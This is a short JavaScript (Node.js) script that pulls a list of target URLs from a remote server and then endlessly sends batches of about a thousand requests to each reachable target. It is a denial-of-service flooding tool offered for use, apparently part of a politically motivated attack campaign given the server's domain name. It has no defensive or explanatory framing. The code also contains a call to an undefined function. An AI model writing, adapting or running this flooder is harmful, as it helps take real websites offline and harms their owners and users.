import fetch from "node-fetch";

const targetUrl = "https://russkijkorablidinahuj.xyz/main/targets";
const requestCount = 1000;

let response = await fetch(targetUrl);
let targets = await response.json();
let isFailedRequest;
// Count errors & successful requests
let errors = 0,
    success = 0,
    errorMessages = []

while (true) {
    for (let item of targets) {
        if (item.status_response == '200') {

            // Send requests with interval
            for (let i = 1; i < requestCount; i++) {
                    isFailedRequest = false;
                    console.log(item.url);

                    fetch(item.url)
                        .catch((err) => {
                            if (err) {
                                if (!errorMessages.includes(err.code)) {
                                    errorMessages.push(err.code)
                                    console.log(`Error: ${red(err)}`)
                                }
                                isFailedRequest = true
                                errors++
                            }
                        })
                        .then(() => {
                            if (!isFailedRequest) {
                                success++
                            }
                            isFailedRequest = false
                        })
                }
                console.log(`Errors: ${(errors)} Success: ${(success)}`)
            };

    };
}



